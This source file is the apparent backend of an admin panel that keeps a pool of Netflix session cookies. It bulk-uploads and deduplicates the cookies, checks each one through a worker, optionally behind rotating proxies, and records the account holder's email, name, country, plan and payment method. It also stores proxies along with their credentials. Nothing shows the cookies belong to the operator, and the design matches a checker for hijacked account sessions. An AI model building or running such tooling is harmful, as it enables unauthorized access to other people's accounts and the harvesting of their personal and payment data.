import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";
import { fingerprintOf, hasNetflixAuthCookie, parseCookieBlob, type CookiePair } from "@/lib/cookie-parser";

// -------------------- Cookie parsing --------------------

// -------------------- Netflix cookie check (via worker) --------------------

type CheckOutcome = {
  status: "active" | "on_hold" | "free" | "invalid" | "unknown";
  is_valid: boolean;
  transient?: boolean;
  proxy_mode: boolean;
  proxy_used: boolean;
  email?: string | null;
  country?: string | null;
  plan_name?: string | null;
  video_quality?: string | null;
  name?: string | null;
  member_since?: string | null;
  max_streams?: number | null;
  payment_method?: string | null;
  last_error?: string | null;
};

async function readProxyMode(supabaseAdmin: any): Promise<boolean> {
  const { data } = await supabaseAdmin
    .from("app_settings")
    .select("value")
    .eq("key", "proxy_mode")
    .maybeSingle();
  return data?.value === "1";
}

async function checkNetflixCookie(pairs: CookiePair[], supabaseAdmin: any): Promise<CheckOutcome> {
  const { checkCookieViaWorker } = await import("@/lib/worker.server");
  const proxyMode = await readProxyMode(supabaseAdmin);
  let proxyPayload: any = null;
  let proxyId: string | null = null;
  if (proxyMode) {
    const { data: pr } = await supabaseAdmin.rpc("pick_next_proxy");
    const p = Array.isArray(pr) ? pr[0] : pr;
    if (p) {
      proxyPayload = { scheme: p.scheme, ip: p.ip, port: p.port, username: p.username, password: p.password };
      proxyId = p.id;
    }
  }
  const out = await checkCookieViaWorker({ cookies: pairs, proxy: proxyPayload });
  if (proxyId) {
    await supabaseAdmin.rpc("release_proxy", {
      _id: proxyId,
      _success: !out.transient,
      _err: out.transient ? out.error ?? "Proxy or Netflix check failed" : undefined,
    });
  }
  return {
    status: out.status,
    is_valid: out.is_valid,
    transient: out.transient ?? false,
    proxy_mode: proxyMode,
    proxy_used: Boolean(proxyPayload),
    email: out.email ?? null,
    country: out.country ?? null,
    plan_name: out.plan_name ?? null,
    video_quality: out.video_quality ?? null,
    name: out.name ?? null,
    member_since: out.member_since ?? null,
    max_streams: out.max_streams ?? null,
    payment_method: out.payment_method ?? null,
    last_error: out.error ?? null,
  };
}


// -------------------- Cookie server functions --------------------

const UploadInput = z.object({
  label: z.string().max(120).optional().default(""),
  blobs: z.array(z.string()).min(1).max(200), // one blob = one account
});

export const uploadCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => UploadInput.parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let inserted = 0, duplicates = 0, invalid = 0;
    for (const blob of data.blobs) {
      const pairs = parseCookieBlob(blob);
      if (pairs.length === 0 || !hasNetflixAuthCookie(pairs)) { invalid++; continue; }
      const fp = fingerprintOf(pairs);
      const { data: dup } = await supabaseAdmin.from("cookie_pool").select("id").eq("fingerprint", fp).maybeSingle();
      if (dup) { duplicates++; continue; }
      const { error } = await supabaseAdmin.from("cookie_pool").insert({
        label: data.label || null,
        cookies_json: pairs,
        fingerprint: fp,
        status: "unknown",
        is_valid: false,
        uploaded_by: userId,
      });
      if (error) { invalid++; continue; }
      inserted++;
    }
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "cookie.upload", details: { inserted, duplicates, invalid },
    });
    return { inserted, duplicates, invalid };
  });

const ListCookiesInput = z.object({
  page: z.number().int().min(0).default(0),
  pageSize: z.number().int().min(10).max(200).default(50),
  status: z.string().optional(),
  country: z.string().optional(),
  q: z.string().trim().max(120).optional(),
  sort: z.enum(["created_at","last_checked_at","total_uses","success_count","fail_count","email"]).default("created_at"),
  sortDir: z.enum(["asc","desc"]).default("desc"),
  stuckOnly: z.boolean().optional(),
});

export const listCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => ListCookiesInput.parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const [{ data: isAdmin }, { data: isMod }] = await Promise.all([
      supabase.rpc("has_role", { _user_id: userId, _role: "admin" }),
      supabase.rpc("has_role", { _user_id: userId, _role: "moderator" }),
    ]);
    if (!isAdmin && !isMod) throw new Error("Forbidden");
    let q = supabase
      .from("cookie_pool")
      .select("id,label,email,country,plan_name,video_quality,name,member_since,max_streams,payment_method,status,is_valid,total_uses,success_count,fail_count,is_locked,locked_at,last_used_at,last_checked_at,last_checked_mode,last_error,created_at", { count: "exact" })
      .order(data.sort, { ascending: data.sortDir === "asc" })
      .range(data.page * data.pageSize, data.page * data.pageSize + data.pageSize - 1);
    if (data.status) q = q.eq("status", data.status);
    if (data.country) q = q.eq("country", data.country.toUpperCase());
    if (data.q) {
      const like = `%${data.q.replace(/[%_]/g, (m) => "\\" + m)}%`;
      q = q.or(`email.ilike.${like},label.ilike.${like},name.ilike.${like}`);
    }
    if (data.stuckOnly) {
      const fiveMinAgo = new Date(Date.now() - 5 * 60_000).toISOString();
      q = q.eq("is_locked", true).lt("locked_at", fiveMinAgo);
    }
    const { data: rows, count, error } = await q;
    if (error) throw error;
    return { rows: rows ?? [], count: count ?? 0 };
  });

export const getCookiePoolStats = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    const [{ data: isAdmin }, { data: isMod }] = await Promise.all([
      supabase.rpc("has_role", { _user_id: userId, _role: "admin" }),
      supabase.rpc("has_role", { _user_id: userId, _role: "moderator" }),
    ]);
    if (!isAdmin && !isMod) throw new Error("Forbidden");
    const { data, error } = await supabase
      .from("cookie_pool")
      .select("status,is_valid,is_locked,locked_at,total_uses,success_count,fail_count,last_checked_at,created_at");
    if (error) throw error;
    const rows = (data ?? []) as any[];
    const now = Date.now();
    const fiveMin = 5 * 60_000;
    const hourMs = 60 * 60_000;
    const byStatus: Record<string, number> = { active: 0, free: 0, on_hold: 0, invalid: 0, unknown: 0 };
    let locked = 0, stuck = 0, checkedLastHour = 0, totalSucc = 0, totalFail = 0, totalUses = 0;
    let latestUpload = 0, latestCheck = 0;
    for (const r of rows) {
      const s = String(r.status ?? "unknown");
      byStatus[s] = (byStatus[s] ?? 0) + 1;
      if (r.is_locked) {
        locked++;
        const t = r.locked_at ? Date.parse(r.locked_at) : 0;
        if (t && now - t > fiveMin) stuck++;
      }
      totalSucc += r.success_count ?? 0;
      totalFail += r.fail_count ?? 0;
      totalUses += r.total_uses ?? 0;
      const lc = r.last_checked_at ? Date.parse(r.last_checked_at) : 0;
      if (lc && now - lc < hourMs) checkedLastHour++;
      if (lc > latestCheck) latestCheck = lc;
      const cr = r.created_at ? Date.parse(r.created_at) : 0;
      if (cr > latestUpload) latestUpload = cr;
    }
    const attempts = totalSucc + totalFail;
    const successRate = attempts > 0 ? Math.round((totalSucc / attempts) * 100) : null;
    return {
      total: rows.length,
      byStatus,
      locked, stuck,
      checkedLastHour,
      successRate,
      totalUses, totalSucc, totalFail,
      latestUploadAt: latestUpload || null,
      latestCheckAt: latestCheck || null,
    };
  });

export const unlockStuckCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const fiveMinAgo = new Date(Date.now() - 5 * 60_000).toISOString();
    const { data, error } = await supabase
      .from("cookie_pool")
      .update({ is_locked: false, locked_at: null })
      .eq("is_locked", true)
      .lt("locked_at", fiveMinAgo)
      .select("id");
    if (error) throw error;
    return { unlocked: (data ?? []).length };
  });

export const bulkDeleteCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ ids: z.array(z.string().uuid()).min(1).max(500) }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const { data: rows, error } = await supabase
      .from("cookie_pool")
      .delete()
      .in("id", data.ids)
      .select("id");
    if (error) throw error;
    return { deleted: (rows ?? []).length };
  });


export const listCookieCountries = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    const [{ data: isAdmin }, { data: isMod }] = await Promise.all([
      supabase.rpc("has_role", { _user_id: userId, _role: "admin" }),
      supabase.rpc("has_role", { _user_id: userId, _role: "moderator" }),
    ]);
    if (!isAdmin && !isMod) throw new Error("Forbidden");
    const { data, error } = await supabase
      .from("cookie_pool")
      .select("country")
      .not("country", "is", null);
    if (error) throw error;
    const counts: Record<string, number> = {};
    for (const r of (data ?? []) as any[]) {
      const c = String(r.country ?? "").trim().toUpperCase();
      if (!c) continue;
      counts[c] = (counts[c] ?? 0) + 1;
    }
    return Object.entries(counts)
      .map(([code, count]) => ({ code, count }))
      .sort((a, b) => b.count - a.count);
  });

export const deleteCookie = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin.from("cookie_pool").delete().eq("id", data.id);
    await supabaseAdmin.from("admin_activity_log").insert({ admin_id: userId, action: "cookie.delete", details: { id: data.id } });
    return { ok: true };
  });

export const checkCookieNow = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const [{ data: isAdmin }, { data: isMod }] = await Promise.all([
      supabase.rpc("has_role", { _user_id: userId, _role: "admin" }),
      supabase.rpc("has_role", { _user_id: userId, _role: "moderator" }),
    ]);
    if (!isAdmin && !isMod) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row, error } = await supabaseAdmin.from("cookie_pool").select("cookies_json").eq("id", data.id).single();
    if (error || !row) throw new Error("Not found");
    const outcome = await checkNetflixCookie(row.cookies_json as CookiePair[], supabaseAdmin);
    await supabaseAdmin.from("cookie_pool").update({
      status: outcome.status,
      is_valid: outcome.is_valid,
      email: outcome.email ?? null,
      country: outcome.country ?? null,
      plan_name: outcome.plan_name ?? null,
      video_quality: outcome.video_quality ?? null,
      name: outcome.name ?? null,
      member_since: outcome.member_since ?? null,
      max_streams: outcome.max_streams ?? null,
      payment_method: outcome.payment_method ?? null,
      last_checked_at: new Date().toISOString(),
      last_checked_mode: outcome.proxy_used ? "proxy" : "direct",
      last_error: outcome.last_error ?? null,
    }).eq("id", data.id);
    return outcome;
  });

export const checkAllCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: rows } = await supabaseAdmin.from("cookie_pool").select("id, cookies_json").limit(500);
    let checked = 0, active = 0, invalid = 0, free = 0, on_hold = 0, unknown = 0;
    for (const r of rows ?? []) {
      const o = await checkNetflixCookie(r.cookies_json as CookiePair[], supabaseAdmin);
      await supabaseAdmin.from("cookie_pool").update({
        status: o.status, is_valid: o.is_valid,
        email: o.email ?? null, country: o.country ?? null, plan_name: o.plan_name ?? null,
        video_quality: o.video_quality ?? null, name: o.name ?? null,
        member_since: o.member_since ?? null, max_streams: o.max_streams ?? null,
        payment_method: o.payment_method ?? null,
        last_checked_at: new Date().toISOString(), last_checked_mode: o.proxy_used ? "proxy" : "direct",
        last_error: o.last_error ?? null,
      }).eq("id", r.id);
      checked++;
      if (o.status === "active") active++;
      if (o.status === "invalid") invalid++;
      if (o.status === "free") free++;
      if (o.status === "on_hold") on_hold++;
      if (o.status === "unknown") unknown++;
    }
    await supabaseAdmin.from("admin_activity_log").insert({ admin_id: userId, action: "cookie.check_all", details: { checked, active, invalid, free, on_hold, unknown } });
    return { checked, active, invalid, free, on_hold, unknown };
  });

// -------------------- Proxy parsing --------------------

type ProxyRow = { raw: string; scheme: string; ip: string; port: string; username?: string | null; password?: string | null };

function parseProxyLine(line: string): ProxyRow | null {
  line = line.trim();
  if (!line) return null;
  let scheme = "http";
  let rest = line;
  const m = line.match(/^(https?|socks[45]):\/\/(.+)$/i);
  if (m) { scheme = m[1].toLowerCase(); rest = m[2]; }
  let user: string | null = null, pass: string | null = null;
  const at = rest.lastIndexOf("@");
  if (at >= 0) {
    const auth = rest.slice(0, at);
    rest = rest.slice(at + 1);
    const c = auth.indexOf(":");
    if (c >= 0) { user = auth.slice(0, c); pass = auth.slice(c + 1); }
    else user = auth;
  }
  // ip:port  OR  ip:port:user:pass
  const parts = rest.split(":");
  if (parts.length === 2) return { raw: line, scheme, ip: parts[0], port: parts[1], username: user, password: pass };
  if (parts.length === 4) return { raw: line, scheme, ip: parts[0], port: parts[1], username: parts[2], password: parts[3] };
  return null;
}

export const uploadProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ text: z.string().max(500_000) }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    let inserted = 0, invalid = 0, duplicates = 0;
    for (const line of data.text.split(/\r?\n/)) {
      const p = parseProxyLine(line);
      if (!p) { if (line.trim()) invalid++; continue; }
      const { data: dup } = await supabaseAdmin.from("proxy_pool").select("id").eq("raw", p.raw).maybeSingle();
      if (dup) { duplicates++; continue; }
      const { error } = await supabaseAdmin.from("proxy_pool").insert(p);
      if (error) invalid++; else inserted++;
    }
    await supabaseAdmin.from("admin_activity_log").insert({ admin_id: userId, action: "proxy.upload", details: { inserted, invalid, duplicates } });
    return { inserted, invalid, duplicates };
  });

export const listProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ page: z.number().int().min(0).default(0), pageSize: z.number().int().min(10).max(200).default(50) }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const [{ data: isAdmin }, { data: isMod }] = await Promise.all([
      supabase.rpc("has_role", { _user_id: userId, _role: "admin" }),
      supabase.rpc("has_role", { _user_id: userId, _role: "moderator" }),
    ]);
    if (!isAdmin && !isMod) throw new Error("Forbidden");
    const { data: rows, count, error } = await supabase
      .from("proxy_pool")
      .select("*", { count: "exact" })
      .order("created_at", { ascending: false })
      .range(data.page * data.pageSize, data.page * data.pageSize + data.pageSize - 1);
    if (error) throw error;
    return { rows: rows ?? [], count: count ?? 0 };
  });

export const deleteProxy = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin.from("proxy_pool").delete().eq("id", data.id);
    return { ok: true };
  });

export const checkAllProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
    if (!isAdmin) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { checkProxyViaWorker } = await import("@/lib/worker.server");
    const { data: rows } = await supabaseAdmin.from("proxy_pool").select("id, scheme, ip, port, username, password").limit(500);
    let valid = 0, invalid = 0;
    for (const p of rows ?? []) {
      const out = await checkProxyViaWorker({
        proxy: { scheme: p.scheme, ip: p.ip, port: p.port, username: p.username, password: p.password },
      });
      await supabaseAdmin.from("proxy_pool").update({
        is_valid: out.ok,
        last_latency_ms: out.latency_ms ?? null,
        last_error: out.error ?? null,
        last_checked_at: new Date().toISOString(),
      }).eq("id", p.id);
      if (out.ok) valid++; else invalid++;
    }
    return { valid, invalid };
  });

// -------------------- Bulk cookie ops (admin-only) --------------------

async function assertAdmin(supabase: any, userId: string) {
  const { data: isAdmin } = await supabase.rpc("has_role", { _user_id: userId, _role: "admin" });
  if (!isAdmin) throw new Error("Forbidden");
}

export const deleteAllCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { count } = await supabaseAdmin.from("cookie_pool").select("id", { count: "exact", head: true });
    const { error } = await supabaseAdmin.from("cookie_pool").delete().not("id", "is", null);
    if (error) throw error;
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "cookie.delete_all", details: { deleted: count ?? 0 },
    });
    return { deleted: count ?? 0 };
  });

export const deleteInvalidCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { count } = await supabaseAdmin
      .from("cookie_pool").select("id", { count: "exact", head: true })
      .or("status.eq.invalid,is_valid.eq.false");
    const { error } = await supabaseAdmin
      .from("cookie_pool").delete().or("status.eq.invalid,is_valid.eq.false");
    if (error) throw error;
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "cookie.delete_invalid", details: { deleted: count ?? 0 },
    });
    return { deleted: count ?? 0 };
  });

export const deleteFreeHoldCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const [{ count: freeCount }, { count: holdCount }] = await Promise.all([
      supabaseAdmin.from("cookie_pool").select("id", { count: "exact", head: true }).eq("status", "free"),
      supabaseAdmin.from("cookie_pool").select("id", { count: "exact", head: true }).eq("status", "on_hold"),
    ]);
    const { error } = await supabaseAdmin
      .from("cookie_pool").delete().in("status", ["free", "on_hold"]);
    if (error) throw error;
    const free = freeCount ?? 0;
    const on_hold = holdCount ?? 0;
    const deleted = free + on_hold;
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "cookie.delete_free_hold", details: { deleted, free, on_hold },
    });
    return { deleted, free, on_hold };
  });

// Mirrors bot.remove_duplicate_cookies — keep newest per email, then dedupe by fingerprint.
export const deleteDuplicateCookies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: rows, error } = await supabaseAdmin
      .from("cookie_pool")
      .select("id,email,fingerprint,created_at")
      .order("created_at", { ascending: false });
    if (error) throw error;
    const seenEmail = new Set<string>();
    const seenFp = new Set<string>();
    const toDelete: string[] = [];
    for (const r of rows ?? []) {
      const em = (r.email ?? "").trim().toLowerCase();
      const fp = (r.fingerprint ?? "").trim();
      let dup = false;
      if (em) { if (seenEmail.has(em)) dup = true; else seenEmail.add(em); }
      if (!dup && fp) { if (seenFp.has(fp)) dup = true; else seenFp.add(fp); }
      if (dup) toDelete.push(r.id);
    }
    let deleted = 0;
    for (let i = 0; i < toDelete.length; i += 200) {
      const chunk = toDelete.slice(i, i + 200);
      const { error: delErr } = await supabaseAdmin.from("cookie_pool").delete().in("id", chunk);
      if (delErr) throw delErr;
      deleted += chunk.length;
    }
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "cookie.remove_duplicates", details: { deleted },
    });
    return { deleted, scanned: rows?.length ?? 0 };
  });

export const getCookieDetail = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d: unknown) => z.object({ id: z.string().uuid() }).parse(d))
  .handler(async ({ context, data }) => {
    const { supabase, userId } = context as any;
    const [{ data: isAdmin }, { data: isMod }] = await Promise.all([
      supabase.rpc("has_role", { _user_id: userId, _role: "admin" }),
      supabase.rpc("has_role", { _user_id: userId, _role: "moderator" }),
    ]);
    if (!isAdmin && !isMod) throw new Error("Forbidden");
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row, error } = await supabaseAdmin
      .from("cookie_pool").select("*").eq("id", data.id).single();
    if (error || !row) throw new Error("Not found");
    return row;
  });

// -------------------- Bulk proxy ops (admin-only) --------------------

export const deleteAllProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { count } = await supabaseAdmin.from("proxy_pool").select("id", { count: "exact", head: true });
    const { error } = await supabaseAdmin.from("proxy_pool").delete().not("id", "is", null);
    if (error) throw error;
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "proxy.delete_all", details: { deleted: count ?? 0 },
    });
    return { deleted: count ?? 0 };
  });

export const deleteInvalidProxies = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabase, userId } = context as any;
    await assertAdmin(supabase, userId);
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { count } = await supabaseAdmin.from("proxy_pool").select("id", { count: "exact", head: true }).eq("is_valid", false);
    const { error } = await supabaseAdmin.from("proxy_pool").delete().eq("is_valid", false);
    if (error) throw error;
    await supabaseAdmin.from("admin_activity_log").insert({
      admin_id: userId, action: "proxy.delete_invalid", details: { deleted: count ?? 0 },
    });
    return { deleted: count ?? 0 };
  });
